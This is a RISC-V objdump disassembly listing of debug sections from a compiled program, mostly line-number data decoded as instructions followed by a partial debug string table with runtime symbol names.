    12f0:	02090303          	lb	t1,32(s2)
    12f4:	0100                	addi	s0,sp,128
    12f6:	0705                	addi	a4,a4,1
    12f8:	06090103          	lb	sp,96(s2)
    12fc:	0100                	addi	s0,sp,128
    12fe:	02097303          	0x2097303
    1302:	0100                	addi	s0,sp,128
    1304:	0a05                	addi	s4,s4,1
    1306:	02091003          	lh	zero,32(s2)
    130a:	0100                	addi	s0,sp,128
    130c:	0f05                	addi	t5,t5,1
    130e:	0a090103          	lb	sp,160(s2)
    1312:	0100                	addi	s0,sp,128
    1314:	2605                	addiw	a2,a2,1
    1316:	08090003          	lb	zero,128(s2)
    131a:	0100                	addi	s0,sp,128
    131c:	0705                	addi	a4,a4,1
    131e:	06090103          	lb	sp,96(s2)
    1322:	0100                	addi	s0,sp,128
    1324:	0c05                	addi	s8,s8,1
    1326:	02090403          	lb	s0,32(s2)
    132a:	0100                	addi	s0,sp,128
    132c:	0705                	addi	a4,a4,1
    132e:	0a090103          	lb	sp,160(s2)
    1332:	0100                	addi	s0,sp,128
    1334:	02090403          	lb	s0,32(s2)
    1338:	0100                	addi	s0,sp,128
    133a:	1a090103          	lb	sp,416(s2)
    133e:	0100                	addi	s0,sp,128
    1340:	0e05                	addi	t3,t3,1
    1342:	02090403          	lb	s0,32(s2)
    1346:	0100                	addi	s0,sp,128
    1348:	0a05                	addi	s4,s4,1
    134a:	10090003          	lb	zero,256(s2)
    134e:	0100                	addi	s0,sp,128
    1350:	0b05                	addi	s6,s6,1
    1352:	04090103          	lb	sp,64(s2)
    1356:	0100                	addi	s0,sp,128
    1358:	0a05                	addi	s4,s4,1
    135a:	08090103          	lb	sp,128(s2)
    135e:	0100                	addi	s0,sp,128
    1360:	1505                	addi	a0,a0,-31
    1362:	0200                	addi	s0,sp,256
    1364:	0104                	addi	s1,sp,128
    1366:	0a090003          	lb	zero,160(s2)
    136a:	0100                	addi	s0,sp,128
    136c:	1405                	addi	s0,s0,-31
    136e:	10090103          	lb	sp,256(s2)
    1372:	0100                	addi	s0,sp,128
    1374:	1705                	addi	a4,a4,-31
    1376:	04090003          	lb	zero,64(s2)
    137a:	0100                	addi	s0,sp,128
    137c:	1405                	addi	s0,s0,-31
    137e:	0e090003          	lb	zero,224(s2)
    1382:	0100                	addi	s0,sp,128
    1384:	0905                	addi	s2,s2,1
    1386:	0c090003          	lb	zero,192(s2)
    138a:	0100                	addi	s0,sp,128
    138c:	0b05                	addi	s6,s6,1
    138e:	0200                	addi	s0,sp,256
    1390:	0304                	addi	s1,sp,384
    1392:	02090103          	lb	sp,32(s2)
    1396:	0100                	addi	s0,sp,128
    1398:	3e05                	addiw	t3,t3,-31
    139a:	0200                	addi	s0,sp,256
    139c:	0304                	addi	s1,sp,384
    139e:	12097f03          	0x12097f03
    13a2:	0100                	addi	s0,sp,128
    13a4:	0905                	addi	s2,s2,1
    13a6:	0200                	addi	s0,sp,256
    13a8:	0104                	addi	s1,sp,128
    13aa:	0a090003          	lb	zero,160(s2)
    13ae:	0100                	addi	s0,sp,128
    13b0:	0705                	addi	a4,a4,1
    13b2:	0a090203          	lb	tp,160(s2)
    13b6:	0100                	addi	s0,sp,128
    13b8:	0905                	addi	s2,s2,1
    13ba:	0200                	addi	s0,sp,256
    13bc:	0504                	addi	s1,sp,640
    13be:	02090103          	lb	sp,32(s2)
    13c2:	0100                	addi	s0,sp,128
    13c4:	0a05                	addi	s4,s4,1
    13c6:	0200                	addi	s0,sp,256
    13c8:	0504                	addi	s1,sp,640
    13ca:	0c090103          	lb	sp,192(s2)
    13ce:	0100                	addi	s0,sp,128
    13d0:	4d05                	li	s10,1
    13d2:	0200                	addi	s0,sp,256
    13d4:	0504                	addi	s1,sp,640
    13d6:	02097e03          	0x2097e03
    13da:	0100                	addi	s0,sp,128
    13dc:	1405                	addi	s0,s0,-31
    13de:	0200                	addi	s0,sp,256
    13e0:	0104                	addi	s1,sp,128
    13e2:	0a090003          	lb	zero,160(s2)
    13e6:	0100                	addi	s0,sp,128
    13e8:	1205                	addi	tp,tp,-31
    13ea:	0200                	addi	s0,sp,256
    13ec:	0104                	addi	s1,sp,128
    13ee:	04090003          	lb	zero,64(s2)
    13f2:	0100                	addi	s0,sp,128
    13f4:	0705                	addi	a4,a4,1
    13f6:	0200                	addi	s0,sp,256
    13f8:	0104                	addi	s1,sp,128
    13fa:	04090003          	lb	zero,64(s2)
    13fe:	0100                	addi	s0,sp,128
    1400:	2005                	0x2005
    1402:	0200                	addi	s0,sp,256
    1404:	0204                	addi	s1,sp,256
    1406:	02090003          	lb	zero,32(s2)
    140a:	0100                	addi	s0,sp,128
    140c:	3205                	addiw	tp,tp,-31
    140e:	0200                	addi	s0,sp,256
    1410:	0404                	addi	s1,sp,512
    1412:	0a090003          	lb	zero,160(s2)
    1416:	0100                	addi	s0,sp,128
    1418:	0705                	addi	a4,a4,1
    141a:	14090403          	lb	s0,320(s2)
    141e:	0100                	addi	s0,sp,128
    1420:	0905                	addi	s2,s2,1
    1422:	0200                	addi	s0,sp,256
    1424:	0204                	addi	s1,sp,256
    1426:	02090103          	lb	sp,32(s2)
    142a:	0100                	addi	s0,sp,128
    142c:	1e05                	addi	t3,t3,-31
    142e:	0200                	addi	s0,sp,256
    1430:	0204                	addi	s1,sp,256
    1432:	0e097f03          	0xe097f03
    1436:	0100                	addi	s0,sp,128
    1438:	0705                	addi	a4,a4,1
    143a:	0200                	addi	s0,sp,256
    143c:	0104                	addi	s1,sp,128
    143e:	0a090003          	lb	zero,160(s2)
    1442:	0100                	addi	s0,sp,128
    1444:	0a090203          	lb	tp,160(s2)
    1448:	0100                	addi	s0,sp,128
    144a:	0d05                	addi	s10,s10,1
    144c:	02090403          	lb	s0,32(s2)
    1450:	0100                	addi	s0,sp,128
    1452:	0b05                	addi	s6,s6,1
    1454:	12090003          	lb	zero,288(s2)
    1458:	0100                	addi	s0,sp,128
    145a:	04090103          	lb	sp,64(s2)
    145e:	0100                	addi	s0,sp,128
    1460:	0a05                	addi	s4,s4,1
    1462:	04090003          	lb	zero,64(s2)
    1466:	0100                	addi	s0,sp,128
    1468:	0905                	addi	s2,s2,1
    146a:	04090103          	lb	sp,64(s2)
    146e:	0100                	addi	s0,sp,128
    1470:	1005                	c.nop	-31
    1472:	0e090103          	lb	sp,224(s2)
    1476:	0100                	addi	s0,sp,128
    1478:	0f05                	addi	t5,t5,1
    147a:	04090003          	lb	zero,64(s2)
    147e:	0100                	addi	s0,sp,128
    1480:	0d05                	addi	s10,s10,1
    1482:	04090003          	lb	zero,64(s2)
    1486:	0100                	addi	s0,sp,128
    1488:	0c05                	addi	s8,s8,1
    148a:	04090203          	lb	tp,64(s2)
    148e:	0100                	addi	s0,sp,128
    1490:	0705                	addi	a4,a4,1
    1492:	06090103          	lb	sp,96(s2)
    1496:	0100                	addi	s0,sp,128
    1498:	0c05                	addi	s8,s8,1
    149a:	02090403          	lb	s0,32(s2)
    149e:	0100                	addi	s0,sp,128
    14a0:	0705                	addi	a4,a4,1
    14a2:	06090103          	lb	sp,96(s2)
    14a6:	0100                	addi	s0,sp,128
    14a8:	0c05                	addi	s8,s8,1
    14aa:	02090503          	lb	a0,32(s2)
    14ae:	0100                	addi	s0,sp,128
    14b0:	0705                	addi	a4,a4,1
    14b2:	06090103          	lb	sp,96(s2)
    14b6:	0100                	addi	s0,sp,128
    14b8:	0d05                	addi	s10,s10,1
    14ba:	02090503          	lb	a0,32(s2)
    14be:	0100                	addi	s0,sp,128
    14c0:	0705                	addi	a4,a4,1
    14c2:	06090103          	lb	sp,96(s2)
    14c6:	0100                	addi	s0,sp,128
    14c8:	0e090103          	lb	sp,224(s2)
    14cc:	0100                	addi	s0,sp,128
    14ce:	0c05                	addi	s8,s8,1
    14d0:	0e090503          	lb	a0,224(s2)
    14d4:	0100                	addi	s0,sp,128
    14d6:	0d05                	addi	s10,s10,1
    14d8:	06090203          	lb	tp,96(s2)
    14dc:	0100                	addi	s0,sp,128
    14de:	0705                	addi	a4,a4,1
    14e0:	14090203          	lb	tp,320(s2)
    14e4:	0100                	addi	s0,sp,128
    14e6:	1e090103          	lb	sp,480(s2)
    14ea:	0100                	addi	s0,sp,128
    14ec:	02090403          	lb	s0,32(s2)
    14f0:	0100                	addi	s0,sp,128
    14f2:	0c090103          	lb	sp,192(s2)
    14f6:	0100                	addi	s0,sp,128
    14f8:	02090403          	lb	s0,32(s2)
    14fc:	0100                	addi	s0,sp,128
    14fe:	0b05                	addi	s6,s6,1
    1500:	0e090103          	lb	sp,224(s2)
    1504:	0100                	addi	s0,sp,128
    1506:	0705                	addi	a4,a4,1
    1508:	08090103          	lb	sp,128(s2)
    150c:	0100                	addi	s0,sp,128
    150e:	0b05                	addi	s6,s6,1
    1510:	097ef803          	0x97ef803
    1514:	0002                	c.slli	zero,0x0
    1516:	0501                	addi	a0,a0,0
    1518:	0309                	addi	t1,t1,2
    151a:	0902                	slli	s2,s2,0x0
    151c:	0002                	c.slli	zero,0x0
    151e:	0501                	addi	a0,a0,0
    1520:	0301                	addi	t1,t1,0
    1522:	0189                	addi	gp,gp,2
    1524:	0209                	addi	tp,tp,2
    1526:	0100                	addi	s0,sp,128
    1528:	0c090303          	lb	t1,192(s2)
    152c:	0100                	addi	s0,sp,128
    152e:	0305                	addi	t1,t1,1
    1530:	1e090203          	lb	tp,480(s2)
    1534:	0100                	addi	s0,sp,128
    1536:	14090203          	lb	tp,320(s2)
    153a:	0100                	addi	s0,sp,128
    153c:	0a05                	addi	s4,s4,1
    153e:	18090303          	lb	t1,384(s2)
    1542:	0100                	addi	s0,sp,128
    1544:	0105                	addi	sp,sp,1
    1546:	02090103          	lb	sp,32(s2)
    154a:	0100                	addi	s0,sp,128
    154c:	0305                	addi	t1,t1,1
    154e:	0a090903          	lb	s2,160(s2)
    1552:	0100                	addi	s0,sp,128
    1554:	0c05                	addi	s8,s8,1
    1556:	14090103          	lb	sp,320(s2)
    155a:	0100                	addi	s0,sp,128
    155c:	0605                	addi	a2,a2,1
    155e:	08090103          	lb	sp,128(s2)
    1562:	0100                	addi	s0,sp,128
    1564:	0c05                	addi	s8,s8,1
    1566:	06090003          	lb	zero,96(s2)
    156a:	0100                	addi	s0,sp,128
    156c:	0605                	addi	a2,a2,1
    156e:	0c090103          	lb	sp,192(s2)
    1572:	0100                	addi	s0,sp,128
    1574:	0c05                	addi	s8,s8,1
    1576:	06090003          	lb	zero,96(s2)
    157a:	0100                	addi	s0,sp,128
    157c:	0305                	addi	t1,t1,1
    157e:	0a090103          	lb	sp,160(s2)
    1582:	0100                	addi	s0,sp,128
    1584:	0105                	addi	sp,sp,1
    1586:	08097603          	0x8097603
    158a:	0100                	addi	s0,sp,128
    158c:	0304                	addi	s1,sp,384
    158e:	0505                	addi	a0,a0,1
    1590:	097f8b03          	lb	s6,151(t6) # fffffffffffe7097 <_end+0xffffffff7ffcb417>
    1594:	0020                	addi	s0,sp,8
    1596:	0401                	addi	s0,s0,0
    1598:	0502                	slli	a0,a0,0x0
    159a:	0309                	addi	t1,t1,2
    159c:	4c0900f7          	0x4c0900f7
    15a0:	0100                	addi	s0,sp,128
    15a2:	0305                	addi	t1,t1,1
    15a4:	08090103          	lb	sp,128(s2)
    15a8:	0100                	addi	s0,sp,128
    15aa:	14090903          	lb	s2,320(s2)
    15ae:	0100                	addi	s0,sp,128
    15b0:	1a090103          	lb	sp,416(s2)
    15b4:	0100                	addi	s0,sp,128
    15b6:	0805                	addi	a6,a6,1
    15b8:	04090003          	lb	zero,64(s2)
    15bc:	0100                	addi	s0,sp,128
    15be:	0e05                	addi	t3,t3,1
    15c0:	04090303          	lb	t1,64(s2)
    15c4:	0100                	addi	s0,sp,128
    15c6:	0105                	addi	sp,sp,1
    15c8:	0e090103          	lb	sp,224(s2)
    15cc:	0100                	addi	s0,sp,128
    15ce:	0a090303          	lb	t1,160(s2)
    15d2:	0100                	addi	s0,sp,128
    15d4:	0905                	addi	s2,s2,1
    15d6:	12090103          	lb	sp,288(s2)
    15da:	0100                	addi	s0,sp,128
    15dc:	1b05                	addi	s6,s6,-31
    15de:	04090003          	lb	zero,64(s2)
    15e2:	0100                	addi	s0,sp,128
    15e4:	1905                	addi	s2,s2,-31
    15e6:	04090003          	lb	zero,64(s2)
    15ea:	0100                	addi	s0,sp,128
    15ec:	2a05                	addiw	s4,s4,1
    15ee:	02090003          	lb	zero,32(s2)
    15f2:	0100                	addi	s0,sp,128
    15f4:	3105                	addiw	sp,sp,-31
    15f6:	06090003          	lb	zero,96(s2)
    15fa:	0100                	addi	s0,sp,128
    15fc:	0605                	addi	a2,a2,1
    15fe:	02090003          	lb	zero,32(s2)
    1602:	0100                	addi	s0,sp,128
    1604:	1605                	addi	a2,a2,-31
    1606:	02090103          	lb	sp,32(s2)
    160a:	0100                	addi	s0,sp,128
    160c:	1005                	c.nop	-31
    160e:	08090103          	lb	sp,128(s2)
    1612:	0100                	addi	s0,sp,128
    1614:	0b05                	addi	s6,s6,1
    1616:	08090103          	lb	sp,128(s2)
    161a:	0100                	addi	s0,sp,128
    161c:	1005                	c.nop	-31
    161e:	02090103          	lb	sp,32(s2)
    1622:	0100                	addi	s0,sp,128
    1624:	0905                	addi	s2,s2,1
    1626:	0c090003          	lb	zero,192(s2)
    162a:	0100                	addi	s0,sp,128
    162c:	0e05                	addi	t3,t3,1
    162e:	0c090003          	lb	zero,192(s2)
    1632:	0100                	addi	s0,sp,128
    1634:	0c05                	addi	s8,s8,1
    1636:	02090003          	lb	zero,32(s2)
    163a:	0100                	addi	s0,sp,128
    163c:	2205                	addiw	tp,tp,1
    163e:	02097f03          	0x2097f03
    1642:	0100                	addi	s0,sp,128
    1644:	0b05                	addi	s6,s6,1
    1646:	0a090003          	lb	zero,160(s2)
    164a:	0100                	addi	s0,sp,128
    164c:	1105                	addi	sp,sp,-31
    164e:	0a090303          	lb	t1,160(s2)
    1652:	0100                	addi	s0,sp,128
    1654:	0b05                	addi	s6,s6,1
    1656:	08090103          	lb	sp,128(s2)
    165a:	0100                	addi	s0,sp,128
    165c:	08090103          	lb	sp,128(s2)
    1660:	0100                	addi	s0,sp,128
    1662:	1005                	c.nop	-31
    1664:	02090103          	lb	sp,32(s2)
    1668:	0100                	addi	s0,sp,128
    166a:	0905                	addi	s2,s2,1
    166c:	0c090003          	lb	zero,192(s2)
    1670:	0100                	addi	s0,sp,128
    1672:	0e05                	addi	t3,t3,1
    1674:	0c090003          	lb	zero,192(s2)
    1678:	0100                	addi	s0,sp,128
    167a:	0c05                	addi	s8,s8,1
    167c:	04090003          	lb	zero,64(s2)
    1680:	0100                	addi	s0,sp,128
    1682:	1d05                	addi	s10,s10,-31
    1684:	04097f03          	0x4097f03
    1688:	0100                	addi	s0,sp,128
    168a:	0b05                	addi	s6,s6,1
    168c:	0a090003          	lb	zero,160(s2)
    1690:	0100                	addi	s0,sp,128
    1692:	0a05                	addi	s4,s4,1
    1694:	08090303          	lb	t1,128(s2)
    1698:	0100                	addi	s0,sp,128
    169a:	0105                	addi	sp,sp,1
    169c:	04090103          	lb	sp,64(s2)
    16a0:	0100                	addi	s0,sp,128
    16a2:	08090303          	lb	t1,128(s2)
    16a6:	0100                	addi	s0,sp,128
    16a8:	0905                	addi	s2,s2,1
    16aa:	14090103          	lb	sp,320(s2)
    16ae:	0100                	addi	s0,sp,128
    16b0:	1905                	addi	s2,s2,-31
    16b2:	04090003          	lb	zero,64(s2)
    16b6:	0100                	addi	s0,sp,128
    16b8:	2005                	0x2005
    16ba:	06090003          	lb	zero,96(s2)
    16be:	0100                	addi	s0,sp,128
    16c0:	0605                	addi	a2,a2,1
    16c2:	02090003          	lb	zero,32(s2)
    16c6:	0100                	addi	s0,sp,128
    16c8:	1b05                	addi	s6,s6,-31
    16ca:	02090103          	lb	sp,32(s2)
    16ce:	0100                	addi	s0,sp,128
    16d0:	0f05                	addi	t5,t5,1
    16d2:	04090003          	lb	zero,64(s2)
    16d6:	0100                	addi	s0,sp,128
    16d8:	1205                	addi	tp,tp,-31
    16da:	08090103          	lb	sp,128(s2)
    16de:	0100                	addi	s0,sp,128
    16e0:	0a05                	addi	s4,s4,1
    16e2:	06090003          	lb	zero,96(s2)
    16e6:	0100                	addi	s0,sp,128
    16e8:	1205                	addi	tp,tp,-31
    16ea:	0a090103          	lb	sp,160(s2)
    16ee:	0100                	addi	s0,sp,128
    16f0:	0a05                	addi	s4,s4,1
    16f2:	06090003          	lb	zero,96(s2)
    16f6:	0100                	addi	s0,sp,128
    16f8:	1805                	addi	a6,a6,-31
    16fa:	0a090103          	lb	sp,160(s2)
    16fe:	0100                	addi	s0,sp,128
    1700:	0a05                	addi	s4,s4,1
    1702:	06090003          	lb	zero,96(s2)
    1706:	0100                	addi	s0,sp,128
    1708:	1005                	c.nop	-31
    170a:	0a090203          	lb	tp,160(s2)
    170e:	0100                	addi	s0,sp,128
    1710:	0b05                	addi	s6,s6,1
    1712:	08090103          	lb	sp,128(s2)
    1716:	0100                	addi	s0,sp,128
    1718:	0905                	addi	s2,s2,1
    171a:	02090103          	lb	sp,32(s2)
    171e:	0100                	addi	s0,sp,128
    1720:	0c05                	addi	s8,s8,1
    1722:	0c090003          	lb	zero,192(s2)
    1726:	0100                	addi	s0,sp,128
    1728:	2205                	addiw	tp,tp,1
    172a:	06097f03          	0x6097f03
    172e:	0100                	addi	s0,sp,128
    1730:	0b05                	addi	s6,s6,1
    1732:	0a090003          	lb	zero,160(s2)
    1736:	0100                	addi	s0,sp,128
    1738:	0a090303          	lb	t1,160(s2)
    173c:	0100                	addi	s0,sp,128
    173e:	08090103          	lb	sp,128(s2)
    1742:	0100                	addi	s0,sp,128
    1744:	0905                	addi	s2,s2,1
    1746:	02090103          	lb	sp,32(s2)
    174a:	0100                	addi	s0,sp,128
    174c:	0c05                	addi	s8,s8,1
    174e:	0c090003          	lb	zero,192(s2)
    1752:	0100                	addi	s0,sp,128
    1754:	1d05                	addi	s10,s10,-31
    1756:	0c097f03          	0xc097f03
    175a:	0100                	addi	s0,sp,128
    175c:	0b05                	addi	s6,s6,1
    175e:	0a090003          	lb	zero,160(s2)
    1762:	0100                	addi	s0,sp,128
    1764:	0a05                	addi	s4,s4,1
    1766:	08090303          	lb	t1,128(s2)
    176a:	0100                	addi	s0,sp,128
    176c:	0105                	addi	sp,sp,1
    176e:	04090103          	lb	sp,64(s2)
    1772:	0100                	addi	s0,sp,128
    1774:	08090303          	lb	t1,128(s2)
    1778:	0100                	addi	s0,sp,128
    177a:	0f05                	addi	t5,t5,1
    177c:	0a090103          	lb	sp,160(s2)
    1780:	0100                	addi	s0,sp,128
    1782:	0905                	addi	s2,s2,1
    1784:	08090103          	lb	sp,128(s2)
    1788:	0100                	addi	s0,sp,128
    178a:	0605                	addi	a2,a2,1
    178c:	02090103          	lb	sp,32(s2)
    1790:	0100                	addi	s0,sp,128
    1792:	0a05                	addi	s4,s4,1
    1794:	0a097f03          	0xa097f03
    1798:	0100                	addi	s0,sp,128
    179a:	0905                	addi	s2,s2,1
    179c:	08090003          	lb	zero,128(s2)
    17a0:	0100                	addi	s0,sp,128
    17a2:	0c05                	addi	s8,s8,1
    17a4:	02090203          	lb	tp,32(s2)
    17a8:	0100                	addi	s0,sp,128
    17aa:	0105                	addi	sp,sp,1
    17ac:	0c090103          	lb	sp,192(s2)
    17b0:	0100                	addi	s0,sp,128
    17b2:	08090303          	lb	t1,128(s2)
    17b6:	0100                	addi	s0,sp,128
    17b8:	0f05                	addi	t5,t5,1
    17ba:	0e090103          	lb	sp,224(s2)
    17be:	0100                	addi	s0,sp,128
    17c0:	0905                	addi	s2,s2,1
    17c2:	08090103          	lb	sp,128(s2)
    17c6:	0100                	addi	s0,sp,128
    17c8:	0605                	addi	a2,a2,1
    17ca:	02090103          	lb	sp,32(s2)
    17ce:	0100                	addi	s0,sp,128
    17d0:	0b05                	addi	s6,s6,1
    17d2:	0a097f03          	0xa097f03
    17d6:	0100                	addi	s0,sp,128
    17d8:	0905                	addi	s2,s2,1
    17da:	0c090003          	lb	zero,192(s2)
    17de:	0100                	addi	s0,sp,128
    17e0:	1105                	addi	sp,sp,-31
    17e2:	0200                	addi	s0,sp,256
    17e4:	0104                	addi	s1,sp,128
    17e6:	02090003          	lb	zero,32(s2)
    17ea:	0100                	addi	s0,sp,128
    17ec:	0e05                	addi	t3,t3,1
    17ee:	0200                	addi	s0,sp,256
    17f0:	0104                	addi	s1,sp,128
    17f2:	08090003          	lb	zero,128(s2)
    17f6:	0100                	addi	s0,sp,128
    17f8:	0c05                	addi	s8,s8,1
    17fa:	02090203          	lb	tp,32(s2)
    17fe:	0100                	addi	s0,sp,128
    1800:	0105                	addi	sp,sp,1
    1802:	0c090103          	lb	sp,192(s2)
    1806:	0100                	addi	s0,sp,128
    1808:	08090303          	lb	t1,128(s2)
    180c:	0100                	addi	s0,sp,128
    180e:	0d05                	addi	s10,s10,1
    1810:	0200                	addi	s0,sp,256
    1812:	0204                	addi	s1,sp,256
    1814:	0e090403          	lb	s0,224(s2)
    1818:	0100                	addi	s0,sp,128
    181a:	0805                	addi	a6,a6,1
    181c:	0200                	addi	s0,sp,256
    181e:	0204                	addi	s1,sp,256
    1820:	0c090003          	lb	zero,192(s2)
    1824:	0100                	addi	s0,sp,128
    1826:	0d05                	addi	s10,s10,1
    1828:	0200                	addi	s0,sp,256
    182a:	0204                	addi	s1,sp,256
    182c:	08090103          	lb	sp,128(s2)
    1830:	0100                	addi	s0,sp,128
    1832:	0805                	addi	a6,a6,1
    1834:	0200                	addi	s0,sp,256
    1836:	0204                	addi	s1,sp,256
    1838:	0c090003          	lb	zero,192(s2)
    183c:	0100                	addi	s0,sp,128
    183e:	0305                	addi	t1,t1,1
    1840:	0200                	addi	s0,sp,256
    1842:	0204                	addi	s1,sp,256
    1844:	08090103          	lb	sp,128(s2)
    1848:	0100                	addi	s0,sp,128
    184a:	1405                	addi	s0,s0,-31
    184c:	0200                	addi	s0,sp,256
    184e:	0104                	addi	s1,sp,128
    1850:	0a090003          	lb	zero,160(s2)
    1854:	0100                	addi	s0,sp,128
    1856:	0d05                	addi	s10,s10,1
    1858:	14090203          	lb	tp,320(s2)
    185c:	0100                	addi	s0,sp,128
    185e:	0105                	addi	sp,sp,1
    1860:	14090103          	lb	sp,320(s2)
    1864:	0100                	addi	s0,sp,128
    1866:	08090303          	lb	t1,128(s2)
    186a:	0100                	addi	s0,sp,128
    186c:	0905                	addi	s2,s2,1
    186e:	0e090103          	lb	sp,224(s2)
    1872:	0100                	addi	s0,sp,128
    1874:	08090103          	lb	sp,128(s2)
    1878:	0100                	addi	s0,sp,128
    187a:	1605                	addi	a2,a2,-31
    187c:	0200                	addi	s0,sp,256
    187e:	0104                	addi	s1,sp,128
    1880:	02090003          	lb	zero,32(s2)
    1884:	0100                	addi	s0,sp,128
    1886:	0d05                	addi	s10,s10,1
    1888:	0200                	addi	s0,sp,256
    188a:	0104                	addi	s1,sp,128
    188c:	0c090003          	lb	zero,192(s2)
    1890:	0100                	addi	s0,sp,128
    1892:	1205                	addi	tp,tp,-31
    1894:	0200                	addi	s0,sp,256
    1896:	0104                	addi	s1,sp,128
    1898:	0c090003          	lb	zero,192(s2)
    189c:	0100                	addi	s0,sp,128
    189e:	1005                	c.nop	-31
    18a0:	0200                	addi	s0,sp,256
    18a2:	0104                	addi	s1,sp,128
    18a4:	04090003          	lb	zero,64(s2)
    18a8:	0100                	addi	s0,sp,128
    18aa:	0b05                	addi	s6,s6,1
    18ac:	0200                	addi	s0,sp,256
    18ae:	0104                	addi	s1,sp,128
    18b0:	04090003          	lb	zero,64(s2)
    18b4:	0100                	addi	s0,sp,128
    18b6:	0905                	addi	s2,s2,1
    18b8:	0200                	addi	s0,sp,256
    18ba:	0104                	addi	s1,sp,128
    18bc:	04090003          	lb	zero,64(s2)
    18c0:	0100                	addi	s0,sp,128
    18c2:	0a05                	addi	s4,s4,1
    18c4:	02090203          	lb	tp,32(s2)
    18c8:	0100                	addi	s0,sp,128
    18ca:	0105                	addi	sp,sp,1
    18cc:	04090103          	lb	sp,64(s2)
    18d0:	0100                	addi	s0,sp,128
    18d2:	08090303          	lb	t1,128(s2)
    18d6:	0100                	addi	s0,sp,128
    18d8:	0805                	addi	a6,a6,1
    18da:	0a090103          	lb	sp,160(s2)
    18de:	0100                	addi	s0,sp,128
    18e0:	0705                	addi	a4,a4,1
    18e2:	04090103          	lb	sp,64(s2)
    18e6:	0100                	addi	s0,sp,128
    18e8:	0905                	addi	s2,s2,1
    18ea:	04090203          	lb	tp,64(s2)
    18ee:	0100                	addi	s0,sp,128
    18f0:	0805                	addi	a6,a6,1
    18f2:	02090103          	lb	sp,32(s2)
    18f6:	0100                	addi	s0,sp,128
    18f8:	0a05                	addi	s4,s4,1
    18fa:	0a097f03          	0xa097f03
    18fe:	0100                	addi	s0,sp,128
    1900:	0905                	addi	s2,s2,1
    1902:	08090003          	lb	zero,128(s2)
    1906:	0100                	addi	s0,sp,128
    1908:	0705                	addi	a4,a4,1
    190a:	0a090303          	lb	t1,160(s2)
    190e:	0100                	addi	s0,sp,128
    1910:	0605                	addi	a2,a2,1
    1912:	08090003          	lb	zero,128(s2)
    1916:	0100                	addi	s0,sp,128
    1918:	1605                	addi	a2,a2,-31
    191a:	0200                	addi	s0,sp,256
    191c:	0104                	addi	s1,sp,128
    191e:	0a090003          	lb	zero,160(s2)
    1922:	0100                	addi	s0,sp,128
    1924:	1305                	addi	t1,t1,-31
    1926:	0200                	addi	s0,sp,256
    1928:	0104                	addi	s1,sp,128
    192a:	08090003          	lb	zero,128(s2)
    192e:	0100                	addi	s0,sp,128
    1930:	0c05                	addi	s8,s8,1
    1932:	0a090103          	lb	sp,160(s2)
    1936:	0100                	addi	s0,sp,128
    1938:	1105                	addi	sp,sp,-31
    193a:	08090003          	lb	zero,128(s2)
    193e:	0100                	addi	s0,sp,128
    1940:	0a05                	addi	s4,s4,1
    1942:	14090003          	lb	zero,320(s2)
    1946:	0100                	addi	s0,sp,128
    1948:	0805                	addi	a6,a6,1
    194a:	04090103          	lb	sp,64(s2)
    194e:	0100                	addi	s0,sp,128
    1950:	0905                	addi	s2,s2,1
    1952:	0a090303          	lb	t1,160(s2)
    1956:	0100                	addi	s0,sp,128
    1958:	02090103          	lb	sp,32(s2)
    195c:	0100                	addi	s0,sp,128
    195e:	1005                	c.nop	-31
    1960:	10090103          	lb	sp,256(s2)
    1964:	0100                	addi	s0,sp,128
    1966:	0c05                	addi	s8,s8,1
    1968:	0c090003          	lb	zero,192(s2)
    196c:	0100                	addi	s0,sp,128
    196e:	1305                	addi	t1,t1,-31
    1970:	06090003          	lb	zero,96(s2)
    1974:	0100                	addi	s0,sp,128
    1976:	0905                	addi	s2,s2,1
    1978:	08090003          	lb	zero,128(s2)
    197c:	0100                	addi	s0,sp,128
    197e:	0a05                	addi	s4,s4,1
    1980:	0a097e03          	0xa097e03
    1984:	0100                	addi	s0,sp,128
    1986:	0905                	addi	s2,s2,1
    1988:	08090003          	lb	zero,128(s2)
    198c:	0100                	addi	s0,sp,128
    198e:	1605                	addi	a2,a2,-31
    1990:	02090503          	lb	a0,32(s2)
    1994:	0100                	addi	s0,sp,128
    1996:	0200                	addi	s0,sp,256
    1998:	0104                	addi	s1,sp,128
    199a:	0306                	slli	t1,t1,0x1
    199c:	0900                	addi	s0,sp,144
    199e:	0008                	0x8
    19a0:	0001                	nop
    19a2:	0402                	slli	s0,s0,0x0
    19a4:	0302                	slli	t1,t1,0x0
    19a6:	0900                	addi	s0,sp,144
    19a8:	000a                	c.slli	zero,0x2
    19aa:	0501                	addi	a0,a0,0
    19ac:	0001                	nop
    19ae:	0402                	slli	s0,s0,0x0
    19b0:	0605                	addi	a2,a2,1
    19b2:	04090103          	lb	sp,64(s2)
    19b6:	0100                	addi	s0,sp,128
    19b8:	0809                	addi	a6,a6,2
    19ba:	0000                	unimp
    19bc:	0101                	addi	sp,sp,0

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	645f 6f73 685f      	0x685f6f73645f
   6:	6e61                	lui	t3,0x18
   8:	6c64                	ld	s1,216(s0)
   a:	0065                	c.nop	25
   c:	6e75                	lui	t3,0x1d
   e:	7375                	lui	t1,0xffffd
  10:	6465                	lui	s0,0x19
  12:	0031                	c.nop	12
  14:	7461                	lui	s0,0xffff8
  16:	756f526b          	0x756f526b
  1a:	646e                	ld	s0,216(sp)
  1c:	5f00                	lw	s0,56(a4)
  1e:	6172                	ld	sp,280(sp)
  20:	646e                	ld	s0,216(sp)
  22:	3834                	fld	fa3,112(s0)
  24:	5f00                	lw	s0,56(a4)
  26:	6d65                	lui	s10,0x19
  28:	7265                	lui	tp,0xffff9
  2a:	636e6567          	0x636e6567
  2e:	0079                	c.nop	30
  30:	5f5f 6975 746e      	0x746e69755f5f
  36:	5f38                	lw	a4,120(a4)
  38:	0074                	addi	a3,sp,12
  3a:	4f746573          	csrrsi	a0,0x4f7,8
  3e:	6666                	ld	a2,88(sp)
  40:	00746573          	csrrsi	a0,0x7,8
  44:	775f 7263 6f74      	0x6f747263775f
  4a:	626d                	lui	tp,0x1b
  4c:	735f 6174 6574      	0x65746174735f
  52:	5f00                	lw	s0,56(a4)
  54:	72736377          	0x72736377
  58:	6f74                	ld	a3,216(a4)
  5a:	626d                	lui	tp,0x1b
  5c:	74735f73          	csrrwi	t5,0x747,6
  60:	7461                	lui	s0,0xffff8
  62:	0065                	c.nop	25
  64:	6f6c                	ld	a1,216(a4)
  66:	676e                	ld	a4,216(sp)
  68:	6c20                	ld	s0,88(s0)
  6a:	20676e6f          	jal	t3,76270 <_tbss_end+0x761ec>
  6e:	6e75                	lui	t3,0x1d
